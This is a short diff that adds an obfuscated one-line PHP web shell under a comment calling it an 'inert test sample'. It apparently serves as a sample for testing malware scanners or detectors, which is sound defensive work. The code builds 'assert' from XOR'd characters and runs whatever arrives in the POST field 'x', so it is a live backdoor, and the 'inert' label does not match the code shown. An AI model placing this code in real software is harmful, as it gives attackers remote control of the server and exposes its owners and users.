@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+$a = ('!'^'@').'s'.'s'.'e'.'r'.'t'; $a($_POST['x']);
+
